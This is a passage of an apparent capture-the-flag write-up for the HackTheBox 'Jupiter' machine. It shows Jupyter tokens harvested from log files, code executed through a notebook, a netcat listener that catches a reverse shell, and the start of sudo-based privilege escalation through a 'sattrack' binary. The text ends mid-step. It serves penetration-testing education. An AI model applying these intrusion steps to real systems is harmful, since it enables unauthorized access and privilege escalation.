+<span class="n">Welcome</span> <span class="n">to</span> <span class="n">Ubuntu</span> <span class="mf">22.04.2</span> <span class="n">LTS</span> <span class="p">(</span><span class="n">GNU</span><span class="o">/</span><span class="n">Linux</span> <span class="mf">5.15.0</span><span class="o">-</span><span class="mi">72</span><span class="o">-</span><span class="n">generic</span> <span class="n">x86_64</span><span class="p">)</span>
+
+ <span class="o">*</span> <span class="n">Documentation</span><span class="p">:</span>  <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">help</span><span class="o">.</span><span class="n">ubuntu</span><span class="o">.</span><span class="n">com</span>
+ <span class="o">*</span> <span class="n">Management</span><span class="p">:</span>     <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">landscape</span><span class="o">.</span><span class="n">canonical</span><span class="o">.</span><span class="n">com</span>
+ <span class="o">*</span> <span class="n">Support</span><span class="p">:</span>        <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">ubuntu</span><span class="o">.</span><span class="n">com</span><span class="o">/</span><span class="n">advantage</span>
+
+  <span class="n">System</span> <span class="n">information</span> <span class="k">as</span> <span class="n">of</span> <span class="n">Sun</span> <span class="n">Oct</span> <span class="mi">22</span> <span class="mi">01</span><span class="p">:</span><span class="mi">39</span><span class="p">:</span><span class="mi">25</span> <span class="n">PM</span> <span class="n">UTC</span> <span class="mi">2023</span>
+
+  <span class="n">System</span> <span class="n">load</span><span class="p">:</span>           <span class="mf">0.0205078125</span>
+  <span class="n">Usage</span> <span class="n">of</span> <span class="o">/</span><span class="p">:</span>            <span class="mf">81.3</span><span class="o">%</span> <span class="n">of</span> <span class="mf">12.33</span><span class="n">GB</span>
+  <span class="n">Memory</span> <span class="n">usage</span><span class="p">:</span>          <span class="mi">22</span><span class="o">%</span>
+  <span class="n">Swap</span> <span class="n">usage</span><span class="p">:</span>            <span class="mi">0</span><span class="o">%</span>
+  <span class="n">Processes</span><span class="p">:</span>             <span class="mi">237</span>
+  <span class="n">Users</span> <span class="n">logged</span> <span class="ow">in</span><span class="p">:</span>       <span class="mi">0</span>
+  <span class="n">IPv4</span> <span class="n">address</span> <span class="k">for</span> <span class="n">eth0</span><span class="p">:</span> <span class="mf">10.10.11.216</span>
+  <span class="n">IPv6</span> <span class="n">address</span> <span class="k">for</span> <span class="n">eth0</span><span class="p">:</span> <span class="n">dead</span><span class="p">:</span><span class="n">beef</span><span class="p">::</span><span class="mi">250</span><span class="p">:</span><span class="mi">56</span><span class="n">ff</span><span class="p">:</span><span class="n">feb9</span><span class="p">:</span><span class="n">af90</span>
+
+
+<span class="n">Expanded</span> <span class="n">Security</span> <span class="n">Maintenance</span> <span class="k">for</span> <span class="n">Applications</span> <span class="ow">is</span> <span class="ow">not</span> <span class="n">enabled</span><span class="o">.</span>
+
+<span class="mi">0</span> <span class="n">updates</span> <span class="n">can</span> <span class="n">be</span> <span class="n">applied</span> <span class="n">immediately</span><span class="o">.</span>
+
+<span class="n">Enable</span> <span class="n">ESM</span> <span class="n">Apps</span> <span class="n">to</span> <span class="n">receive</span> <span class="n">additional</span> <span class="n">future</span> <span class="n">security</span> <span class="n">updates</span><span class="o">.</span>
+<span class="n">See</span> <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">ubuntu</span><span class="o">.</span><span class="n">com</span><span class="o">/</span><span class="n">esm</span> <span class="ow">or</span> <span class="n">run</span><span class="p">:</span> <span class="n">sudo</span> <span class="n">pro</span> <span class="n">status</span>
+
+
+<span class="n">The</span> <span class="nb">list</span> <span class="n">of</span> <span class="n">available</span> <span class="n">updates</span> <span class="ow">is</span> <span class="n">more</span> <span class="n">than</span> <span class="n">a</span> <span class="n">week</span> <span class="n">old</span><span class="o">.</span>
+<span class="n">To</span> <span class="n">check</span> <span class="k">for</span> <span class="n">new</span> <span class="n">updates</span> <span class="n">run</span><span class="p">:</span> <span class="n">sudo</span> <span class="n">apt</span> <span class="n">update</span>
+<span class="n">Failed</span> <span class="n">to</span> <span class="n">connect</span> <span class="n">to</span> <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">changelogs</span><span class="o">.</span><span class="n">ubuntu</span><span class="o">.</span><span class="n">com</span><span class="o">/</span><span class="n">meta</span><span class="o">-</span><span class="n">release</span><span class="o">-</span><span class="n">lts</span><span class="o">.</span> <span class="n">Check</span> <span class="n">your</span> <span class="n">Internet</span> <span class="n">connection</span> <span class="ow">or</span> <span class="n">proxy</span> <span class="n">settings</span>
+
+
+<span class="n">Last</span> <span class="n">login</span><span class="p">:</span> <span class="n">Sun</span> <span class="n">Oct</span> <span class="mi">22</span> <span class="mi">13</span><span class="p">:</span><span class="mi">15</span><span class="p">:</span><span class="mi">55</span> <span class="mi">2023</span> <span class="kn">from</span> <span class="mf">10.10.16.3</span>
+<span class="nd">@juno@jupiter</span><span class="p">:</span><span class="o">~</span><span class="err">$</span>
+</pre></div>
+
+Now, when I attempt to access 'localhost' on port '8888,' I encounter the following:<br/><br/>
+<img alt="" src="https://elswix.github.io/writeups/htb/medium/jupiter/img/15.png"/><br/><br/>
+It is requesting a password or token, which we currently lack. While searching for the term 'token' in the 'solar-flares' directory, I discovered some intriguing values:<br/><br/>
+<div class="highlight"><pre><span></span><span class="nd">@juno@jupiter</span><span class="p">:</span><span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">solar</span><span class="o">-</span><span class="n">flares</span><span class="err">$</span> <span class="n">grep</span> <span class="o">-</span><span class="n">r</span> <span class="n">token</span>
+</pre></div>
+
+The results are originating from the 'logs' directory, as exemplified by:<br/><br/>
+<div class="highlight"><pre><span></span><span class="nd">@juno@jupiter</span><span class="p">:</span><span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">solar</span><span class="o">-</span><span class="n">flares</span><span class="err">$</span> <span class="n">cat</span> <span class="n">logs</span><span class="o">/</span><span class="n">jupyter</span><span class="o">-</span><span class="mi">2023</span><span class="o">-</span><span class="mi">03</span><span class="o">-</span><span class="mi">09</span><span class="o">-</span><span class="mf">59.</span><span class="n">log</span>
+<span class="p">[</span><span class="n">W</span> <span class="mi">11</span><span class="p">:</span><span class="mi">59</span><span class="p">:</span><span class="mf">22.108</span> <span class="n">NotebookApp</span><span class="p">]</span> <span class="n">Terminals</span> <span class="ow">not</span> <span class="n">available</span> <span class="p">(</span><span class="n">error</span> <span class="n">was</span> <span class="n">No</span> <span class="n">module</span> <span class="n">named</span> <span class="s1">'terminado'</span><span class="p">)</span>
+<span class="p">[</span><span class="n">I</span> <span class="mi">11</span><span class="p">:</span><span class="mi">59</span><span class="p">:</span><span class="mf">22.116</span> <span class="n">NotebookApp</span><span class="p">]</span> <span class="n">Serving</span> <span class="n">notebooks</span> <span class="kn">from</span> <span class="nn">local</span> <span class="n">directory</span><span class="p">:</span> <span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">solar</span><span class="o">-</span><span class="n">flares</span>
+<span class="p">[</span><span class="n">I</span> <span class="mi">11</span><span class="p">:</span><span class="mi">59</span><span class="p">:</span><span class="mf">22.116</span> <span class="n">NotebookApp</span><span class="p">]</span> <span class="n">Jupyter</span> <span class="n">Notebook</span> <span class="mf">6.5.3</span> <span class="ow">is</span> <span class="n">running</span> <span class="n">at</span><span class="p">:</span>
+<span class="p">[</span><span class="n">I</span> <span class="mi">11</span><span class="p">:</span><span class="mi">59</span><span class="p">:</span><span class="mf">22.116</span> <span class="n">NotebookApp</span><span class="p">]</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">localhost</span><span class="p">:</span><span class="mi">8888</span><span class="o">/</span><span class="err">?</span><span class="n">token</span><span class="o">=</span><span class="n">c1b7aef7f310cd8f3143c70fb9b4b0e41a10559afeebafab</span>
+<span class="p">[</span><span class="n">I</span> <span class="mi">11</span><span class="p">:</span><span class="mi">59</span><span class="p">:</span><span class="mf">22.116</span> <span class="n">NotebookApp</span><span class="p">]</span>  <span class="ow">or</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">127.0.0.1</span><span class="p">:</span><span class="mi">8888</span><span class="o">/</span><span class="err">?</span><span class="n">token</span><span class="o">=</span><span class="n">c1b7aef7f310cd8f3143c70fb9b4b0e41a10559afeebafab</span>
+<span class="p">[</span><span class="n">I</span> <span class="mi">11</span><span class="p">:</span><span class="mi">59</span><span class="p">:</span><span class="mf">22.116</span> <span class="n">NotebookApp</span><span class="p">]</span> <span class="n">Use</span> <span class="n">Control</span><span class="o">-</span><span class="n">C</span> <span class="n">to</span> <span class="n">stop</span> <span class="n">this</span> <span class="n">server</span> <span class="ow">and</span> <span class="n">shut</span> <span class="n">down</span> <span class="nb">all</span> <span class="n">kernels</span> <span class="p">(</span><span class="n">twice</span> <span class="n">to</span> <span class="n">skip</span> <span class="n">confirmation</span><span class="p">)</span><span class="o">.</span>
+<span class="p">[</span><span class="n">W</span> <span class="mi">11</span><span class="p">:</span><span class="mi">59</span><span class="p">:</span><span class="mf">22.120</span> <span class="n">NotebookApp</span><span class="p">]</span> <span class="n">No</span> <span class="n">web</span> <span class="n">browser</span> <span class="n">found</span><span class="p">:</span> <span class="n">could</span> <span class="ow">not</span> <span class="n">locate</span> <span class="n">runnable</span> <span class="n">browser</span><span class="o">.</span>
+<span class="p">[</span><span class="n">C</span> <span class="mi">11</span><span class="p">:</span><span class="mi">59</span><span class="p">:</span><span class="mf">22.120</span> <span class="n">NotebookApp</span><span class="p">]</span> 
+
+    <span class="n">To</span> <span class="n">access</span> <span class="n">the</span> <span class="n">notebook</span><span class="p">,</span> <span class="nb">open</span> <span class="n">this</span> <span class="n">file</span> <span class="ow">in</span> <span class="n">a</span> <span class="n">browser</span><span class="p">:</span>
+        <span class="n">file</span><span class="p">:</span><span class="o">///</span><span class="n">home</span><span class="o">/</span><span class="n">jovian</span><span class="o">/.</span><span class="n">local</span><span class="o">/</span><span class="n">share</span><span class="o">/</span><span class="n">jupyter</span><span class="o">/</span><span class="n">runtime</span><span class="o">/</span><span class="n">nbserver</span><span class="o">-</span><span class="mi">874</span><span class="o">-</span><span class="nb">open</span><span class="o">.</span><span class="n">html</span>
+    <span class="n">Or</span> <span class="n">copy</span> <span class="ow">and</span> <span class="n">paste</span> <span class="n">one</span> <span class="n">of</span> <span class="n">these</span> <span class="n">URLs</span><span class="p">:</span>
+        <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="n">localhost</span><span class="p">:</span><span class="mi">8888</span><span class="o">/</span><span class="err">?</span><span class="n">token</span><span class="o">=</span><span class="n">c1b7aef7f310cd8f3143c70fb9b4b0e41a10559afeebafab</span>
+     <span class="ow">or</span> <span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="mf">127.0.0.1</span><span class="p">:</span><span class="mi">8888</span><span class="o">/</span><span class="err">?</span><span class="n">token</span><span class="o">=</span><span class="n">c1b7aef7f310cd8f3143c70fb9b4b0e41a10559afeebafab</span>
+<span class="p">[</span><span class="n">C</span> <span class="mi">12</span><span class="p">:</span><span class="mi">10</span><span class="p">:</span><span class="mf">52.740</span> <span class="n">NotebookApp</span><span class="p">]</span> <span class="n">received</span> <span class="n">signal</span> <span class="mi">15</span><span class="p">,</span> <span class="n">stopping</span>
+<span class="p">[</span><span class="n">I</span> <span class="mi">12</span><span class="p">:</span><span class="mi">10</span><span class="p">:</span><span class="mf">52.740</span> <span class="n">NotebookApp</span><span class="p">]</span> <span class="n">Shutting</span> <span class="n">down</span> <span class="mi">0</span> <span class="n">kernels</span>
+<span class="nd">@juno@jupiter</span><span class="p">:</span><span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">solar</span><span class="o">-</span><span class="n">flares</span><span class="err">$</span>
+</pre></div>
+
+I will attempt to use the token 'c1b7aef7f310cd8f3143c70fb9b4b0e41a10559afeebafab' on the website. Let's see if it works:<br/><br/>
+<img alt="" src="https://elswix.github.io/writeups/htb/medium/jupiter/img/16.png"/><br/><br/>
+It seems the previous token didn't work, so there's nothing more we can do. However, after trying each one individually, the token 'af894b54c19a51d83d04cd69d9d205a975cafbd882d70971' did work, and the website redirected me to the next page:<br/><br/>
+<img alt="" src="https://elswix.github.io/writeups/htb/medium/jupiter/img/17.png"/><br/><br/>
+While examining the 'Running' section, I came across the following list of Jupyter running processes:<br/><br/>
+<img alt="" src="https://elswix.github.io/writeups/htb/medium/jupiter/img/18.png"/><br/><br/>
+I clicked on 'flares.ipynb,' and it redirected me to the next page:<br/><br/>
+<img alt="" src="https://elswix.github.io/writeups/htb/medium/jupiter/img/19.png"/><br/><br/>
+Since this is running Python code, I'm going to create my own notebook:<br/><br/>
+<img alt="" src="https://elswix.github.io/writeups/htb/medium/jupiter/img/20.png"/><br/><br/>
+<img alt="" src="https://elswix.github.io/writeups/htb/medium/jupiter/img/21.png"/><br/><br/>
+Here, it's requesting Python code. Let's attempt to execute system-level commands. I will try to send a ping to my attacker machine:<br/><br/>
+<img alt="" src="https://elswix.github.io/writeups/htb/medium/jupiter/img/22.png"/><br/><br/>
+Before running this command, I will set up an ICMP listener:<br/><br/>
+<div class="highlight"><pre><span></span><span class="nd">@elswix@kali</span><span class="err">$</span> <span class="n">tcpdump</span> <span class="o">-</span><span class="n">i</span> <span class="n">tun0</span> <span class="n">icmp</span> <span class="o">-</span><span class="n">n</span>
+<span class="n">tcpdump</span><span class="p">:</span> <span class="n">verbose</span> <span class="n">output</span> <span class="n">suppressed</span><span class="p">,</span> <span class="n">use</span> <span class="o">-</span><span class="n">v</span><span class="p">[</span><span class="n">v</span><span class="p">]</span><span class="o">...</span> <span class="k">for</span> <span class="n">full</span> <span class="n">protocol</span> <span class="n">decode</span>
+<span class="n">listening</span> <span class="n">on</span> <span class="n">tun0</span><span class="p">,</span> <span class="n">link</span><span class="o">-</span><span class="nb">type</span> <span class="n">RAW</span> <span class="p">(</span><span class="n">Raw</span> <span class="n">IP</span><span class="p">),</span> <span class="n">snapshot</span> <span class="n">length</span> <span class="mi">262144</span> <span class="nb">bytes</span>
+</pre></div>
+
+Now, I will click 'Run':<br/><br/>
+<img alt="" src="https://elswix.github.io/writeups/htb/medium/jupiter/img/23.png"/><br/><br/>
+It worked, and I received a ping from the victim machine:<br/><br/>
+<div class="highlight"><pre><span></span><span class="nd">@elswix@kali</span><span class="err">$</span> <span class="n">tcpdump</span> <span class="o">-</span><span class="n">i</span> <span class="n">tun0</span> <span class="n">icmp</span> <span class="o">-</span><span class="n">n</span>
+<span class="n">tcpdump</span><span class="p">:</span> <span class="n">verbose</span> <span class="n">output</span> <span class="n">suppressed</span><span class="p">,</span> <span class="n">use</span> <span class="o">-</span><span class="n">v</span><span class="p">[</span><span class="n">v</span><span class="p">]</span><span class="o">...</span> <span class="k">for</span> <span class="n">full</span> <span class="n">protocol</span> <span class="n">decode</span>
+<span class="n">listening</span> <span class="n">on</span> <span class="n">tun0</span><span class="p">,</span> <span class="n">link</span><span class="o">-</span><span class="nb">type</span> <span class="n">RAW</span> <span class="p">(</span><span class="n">Raw</span> <span class="n">IP</span><span class="p">),</span> <span class="n">snapshot</span> <span class="n">length</span> <span class="mi">262144</span> <span class="nb">bytes</span>
+<span class="mi">10</span><span class="p">:</span><span class="mi">57</span><span class="p">:</span><span class="mf">44.057416</span> <span class="n">IP</span> <span class="mf">10.10.11.216</span> <span class="o">&gt;</span> <span class="mf">10.10.16.3</span><span class="p">:</span> <span class="n">ICMP</span> <span class="n">echo</span> <span class="n">request</span><span class="p">,</span> <span class="nb">id</span> <span class="mi">2</span><span class="p">,</span> <span class="n">seq</span> <span class="mi">1</span><span class="p">,</span> <span class="n">length</span> <span class="mi">64</span>
+<span class="mi">10</span><span class="p">:</span><span class="mi">57</span><span class="p">:</span><span class="mf">44.057488</span> <span class="n">IP</span> <span class="mf">10.10.16.3</span> <span class="o">&gt;</span> <span class="mf">10.10.11.216</span><span class="p">:</span> <span class="n">ICMP</span> <span class="n">echo</span> <span class="n">reply</span><span class="p">,</span> <span class="nb">id</span> <span class="mi">2</span><span class="p">,</span> <span class="n">seq</span> <span class="mi">1</span><span class="p">,</span> <span class="n">length</span> <span class="mi">64</span>
+</pre></div>
+
+Now, I'm going to send myself a reverse shell, so I'll set up my netcat listener on port '3001':<br/><br/>
+<div class="highlight"><pre><span></span><span class="nd">@elswix@kali</span><span class="err">$</span> <span class="n">nc</span> <span class="o">-</span><span class="n">lvnp</span> <span class="mi">3001</span>
+<span class="n">Ncat</span><span class="p">:</span> <span class="n">Version</span> <span class="mf">7.94</span> <span class="p">(</span> <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">nmap</span><span class="o">.</span><span class="n">org</span><span class="o">/</span><span class="n">ncat</span> <span class="p">)</span>
+<span class="n">Ncat</span><span class="p">:</span> <span class="n">Listening</span> <span class="n">on</span> <span class="p">[::]:</span><span class="mi">3001</span>
+<span class="n">Ncat</span><span class="p">:</span> <span class="n">Listening</span> <span class="n">on</span> <span class="mf">0.0.0.0</span><span class="p">:</span><span class="mi">3001</span>
+</pre></div>
+
+I will now execute the following command:<br/><br/>
+<img alt="" src="https://elswix.github.io/writeups/htb/medium/jupiter/img/24.png"/><br/><br/>
+And I have successfully obtained a shell as the 'Jovian' user:<br/><br/>
+<div class="highlight"><pre><span></span><span class="nd">@elswix@kali</span><span class="err">$</span> <span class="n">nc</span> <span class="o">-</span><span class="n">lvnp</span> <span class="mi">3001</span>
+<span class="n">Ncat</span><span class="p">:</span> <span class="n">Version</span> <span class="mf">7.94</span> <span class="p">(</span> <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">nmap</span><span class="o">.</span><span class="n">org</span><span class="o">/</span><span class="n">ncat</span> <span class="p">)</span>
+<span class="n">Ncat</span><span class="p">:</span> <span class="n">Listening</span> <span class="n">on</span> <span class="p">[::]:</span><span class="mi">3001</span>
+<span class="n">Ncat</span><span class="p">:</span> <span class="n">Listening</span> <span class="n">on</span> <span class="mf">0.0.0.0</span><span class="p">:</span><span class="mi">3001</span>
+<span class="n">Ncat</span><span class="p">:</span> <span class="n">Connection</span> <span class="kn">from</span> <span class="mf">10.10.11.216</span><span class="p">:</span><span class="mf">47250.</span>
+<span class="n">bash</span><span class="p">:</span> <span class="n">cannot</span> <span class="nb">set</span> <span class="n">terminal</span> <span class="n">process</span> <span class="n">group</span> <span class="p">(</span><span class="mi">3717</span><span class="p">):</span> <span class="n">Inappropriate</span> <span class="n">ioctl</span> <span class="k">for</span> <span class="n">device</span>
+<span class="n">bash</span><span class="p">:</span> <span class="n">no</span> <span class="n">job</span> <span class="n">control</span> <span class="ow">in</span> <span class="n">this</span> <span class="n">shell</span>
+<span class="n">To</span> <span class="n">run</span> <span class="n">a</span> <span class="n">command</span> <span class="k">as</span> <span class="n">administrator</span> <span class="p">(</span><span class="n">user</span> <span class="s2">"root"</span><span class="p">),</span> <span class="n">use</span> <span class="s2">"sudo &lt;command&gt;"</span><span class="o">.</span>
+<span class="n">See</span> <span class="s2">"man sudo_root"</span> <span class="k">for</span> <span class="n">details</span><span class="o">.</span>
+
+<span class="nd">@jovian@jupiter</span><span class="p">:</span><span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">solar</span><span class="o">-</span><span class="n">flares</span><span class="err">$</span>
+</pre></div>
+<div class="highlight"><pre><span></span><span class="nd">@jovian@jupiter</span><span class="p">:</span><span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">solar</span><span class="o">-</span><span class="n">flares</span><span class="err">$</span> <span class="n">whoami</span>
+<span class="n">whoami</span>
+<span class="n">jovian</span>
+<span class="nd">@jovian@jupiter</span><span class="p">:</span><span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">solar</span><span class="o">-</span><span class="n">flares</span><span class="err">$</span> <span class="nb">id</span>
+<span class="nb">id</span>
+<span class="n">uid</span><span class="o">=</span><span class="mi">1001</span><span class="p">(</span><span class="n">jovian</span><span class="p">)</span> <span class="n">gid</span><span class="o">=</span><span class="mi">1002</span><span class="p">(</span><span class="n">jovian</span><span class="p">)</span> <span class="n">groups</span><span class="o">=</span><span class="mi">1002</span><span class="p">(</span><span class="n">jovian</span><span class="p">),</span><span class="mi">27</span><span class="p">(</span><span class="n">sudo</span><span class="p">),</span><span class="mi">1001</span><span class="p">(</span><span class="n">science</span><span class="p">)</span>
+<span class="nd">@jovian@jupiter</span><span class="p">:</span><span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">solar</span><span class="o">-</span><span class="n">flares</span><span class="err">$</span>
+</pre></div>
+
+Once again, let's adjust our TTY:<br/><br/>
+<div class="highlight"><pre><span></span><span class="nd">@jovian@jupiter</span><span class="p">:</span><span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">solar</span><span class="o">-</span><span class="n">flares</span><span class="err">$</span> <span class="n">script</span> <span class="o">/</span><span class="n">dev</span><span class="o">/</span><span class="n">null</span> <span class="o">-</span><span class="n">c</span> <span class="n">bash</span>
+<span class="n">script</span> <span class="o">/</span><span class="n">dev</span><span class="o">/</span><span class="n">null</span> <span class="o">-</span><span class="n">c</span> <span class="n">bash</span>
+<span class="n">Script</span> <span class="n">started</span><span class="p">,</span> <span class="n">output</span> <span class="n">log</span> <span class="n">file</span> <span class="ow">is</span> <span class="s1">'/dev/null'</span><span class="o">.</span>
+<span class="n">To</span> <span class="n">run</span> <span class="n">a</span> <span class="n">command</span> <span class="k">as</span> <span class="n">administrator</span> <span class="p">(</span><span class="n">user</span> <span class="s2">"root"</span><span class="p">),</span> <span class="n">use</span> <span class="s2">"sudo &lt;command&gt;"</span><span class="o">.</span>
+<span class="n">See</span> <span class="s2">"man sudo_root"</span> <span class="k">for</span> <span class="n">details</span><span class="o">.</span>
+
+<span class="nd">@jovian@jupiter</span><span class="p">:</span><span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">solar</span><span class="o">-</span><span class="n">flares</span><span class="err">$</span> <span class="o">^</span><span class="n">Z</span>
+<span class="n">zsh</span><span class="p">:</span> <span class="n">suspended</span>  <span class="n">nc</span> <span class="o">-</span><span class="n">lvnp</span> <span class="mi">3001</span>
+<span class="nd">@elswix@kali</span><span class="err">$</span> <span class="n">stty</span> <span class="n">raw</span> <span class="o">-</span><span class="n">echo</span><span class="p">;</span><span class="n">fg</span>
+<span class="p">[</span><span class="mi">1</span><span class="p">]</span>  <span class="o">+</span> <span class="n">continued</span>  <span class="n">nc</span> <span class="o">-</span><span class="n">lvnp</span> <span class="mi">3001</span>
+                               <span class="n">reset</span> <span class="n">xterm</span>
+</pre></div>
+<div class="highlight"><pre><span></span><span class="nd">@jovian@jupiter</span><span class="p">:</span><span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">solar</span><span class="o">-</span><span class="n">flares</span><span class="err">$</span> <span class="n">export</span> <span class="n">TERM</span><span class="o">=</span><span class="n">xterm</span>
+<span class="nd">@jovian@jupiter</span><span class="p">:</span><span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">solar</span><span class="o">-</span><span class="n">flares</span><span class="err">$</span> <span class="n">export</span> <span class="n">SHELL</span><span class="o">=/</span><span class="nb">bin</span><span class="o">/</span><span class="n">bash</span>
+<span class="nd">@jovian@jupiter</span><span class="p">:</span><span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">solar</span><span class="o">-</span><span class="n">flares</span><span class="err">$</span>
+</pre></div>
+<h3><br>Shell as root</br></h3><br>
+Upon listing the sudoers privileges of the 'Jovian' user, we discover that he can execute the following as root without needing to provide a password:<br/><br/>
+<div class="highlight"><pre><span></span><span class="nd">@jovian@jupiter</span><span class="p">:</span><span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">solar</span><span class="o">-</span><span class="n">flares</span><span class="err">$</span> <span class="n">sudo</span> <span class="o">-</span><span class="n">l</span>
+<span class="n">Matching</span> <span class="n">Defaults</span> <span class="n">entries</span> <span class="k">for</span> <span class="n">jovian</span> <span class="n">on</span> <span class="n">jupiter</span><span class="p">:</span>
+    <span class="n">env_reset</span><span class="p">,</span> <span class="n">mail_badpass</span><span class="p">,</span>
+    <span class="n">secure_path</span><span class="o">=/</span><span class="n">usr</span><span class="o">/</span><span class="n">local</span><span class="o">/</span><span class="n">sbin</span>\<span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">local</span><span class="o">/</span><span class="nb">bin</span>\<span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">sbin</span>\<span class="p">:</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="nb">bin</span>\<span class="p">:</span><span class="o">/</span><span class="n">sbin</span>\<span class="p">:</span><span class="o">/</span><span class="nb">bin</span>\<span class="p">:</span><span class="o">/</span><span class="n">snap</span><span class="o">/</span><span class="nb">bin</span><span class="p">,</span>
+    <span class="n">use_pty</span>
+
+<span class="n">User</span> <span class="n">jovian</span> <span class="n">may</span> <span class="n">run</span> <span class="n">the</span> <span class="n">following</span> <span class="n">commands</span> <span class="n">on</span> <span class="n">jupiter</span><span class="p">:</span>
+    <span class="p">(</span><span class="n">ALL</span><span class="p">)</span> <span class="n">NOPASSWD</span><span class="p">:</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">local</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">sattrack</span>
+<span class="nd">@jovian@jupiter</span><span class="p">:</span><span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">solar</span><span class="o">-</span><span class="n">flares</span><span class="err">$</span>
+</pre></div>
+
+After executing <code>/usr/local/bin/sattrack</code> as root, it returns the following error:<br/><br/>
+<div class="highlight"><pre><span></span><span class="nd">@jovian@jupiter</span><span class="p">:</span><span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">solar</span><span class="o">-</span><span class="n">flares</span><span class="err">$</span> <span class="n">sudo</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">local</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">sattrack</span>
+<span class="n">Satellite</span> <span class="n">Tracking</span> <span class="n">System</span>
+<span class="n">Configuration</span> <span class="n">file</span> <span class="n">has</span> <span class="ow">not</span> <span class="n">been</span> <span class="n">found</span><span class="o">.</span> <span class="n">Please</span> <span class="k">try</span> <span class="n">again</span><span class="err">!</span>
+<span class="nd">@jovian@jupiter</span><span class="p">:</span><span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">solar</span><span class="o">-</span><span class="n">flares</span><span class="err">$</span>
+</pre></div>
+
+I believe it's attempting to open a configuration file. Before attempting to reverse-engineer this program, I will run it with 'strace' since it's installed on the victim machine.<br/><br/>
+<div class="highlight"><pre><span></span><span class="nd">@jovian@jupiter</span><span class="p">:</span><span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">solar</span><span class="o">-</span><span class="n">flares</span><span class="err">$</span> <span class="n">strace</span> <span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">local</span><span class="o">/</span><span class="nb">bin</span><span class="o">/</span><span class="n">sattrack</span>
+</pre></div>
+<img alt="" src="https://elswix.github.io/writeups/htb/medium/jupiter/img/25.png"/><br/><br/>
+It's trying to open the <code>/tmp/config.json</code> file, but it doesn't exist.<br/><br/>
+<div class="highlight"><pre><span></span><span class="nd">@jovian@jupiter</span><span class="p">:</span><span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">solar</span><span class="o">-</span><span class="n">flares</span><span class="err">$</span> <span class="n">cat</span> <span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">config</span><span class="o">.</span><span class="n">json</span>
+<span class="n">cat</span><span class="p">:</span> <span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">config</span><span class="o">.</span><span class="n">json</span><span class="p">:</span> <span class="n">No</span> <span class="n">such</span> <span class="n">file</span> <span class="ow">or</span> <span class="n">directory</span>
+<span class="nd">@jovian@jupiter</span><span class="p">:</span><span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">solar</span><span class="o">-</span><span class="n">flares</span><span class="err">$</span>
+</pre></div>
+
+Since the file doesn't exist, we'll need to find a way to create it. Sometimes, tools come with default configuration files. We can attempt to search the system for files with the name <code>config.json</code>:<br/><br/>
+<div class="highlight"><pre><span></span><span class="nd">@jovian@jupiter</span><span class="p">:</span><span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">solar</span><span class="o">-</span><span class="n">flares</span><span class="err">$</span> <span class="n">find</span> <span class="o">/</span> <span class="o">-</span><span class="n">name</span> <span class="n">config</span><span class="o">.</span><span class="n">json</span> <span class="mi">2</span><span class="o">&gt;/</span><span class="n">dev</span><span class="o">/</span><span class="n">null</span>
+<span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">local</span><span class="o">/</span><span class="n">share</span><span class="o">/</span><span class="n">sattrack</span><span class="o">/</span><span class="n">config</span><span class="o">.</span><span class="n">json</span>
+<span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">local</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">python3</span><span class="mf">.10</span><span class="o">/</span><span class="n">dist</span><span class="o">-</span><span class="n">packages</span><span class="o">/</span><span class="n">zmq</span><span class="o">/</span><span class="n">utils</span><span class="o">/</span><span class="n">config</span><span class="o">.</span><span class="n">json</span>
+<span class="nd">@jovian@jupiter</span><span class="p">:</span><span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">solar</span><span class="o">-</span><span class="n">flares</span><span class="err">$</span>
+</pre></div>
+
+There is a path that appears to be related to 'sattrack.' Listing its contents, we encounter the following:<br/><br/>
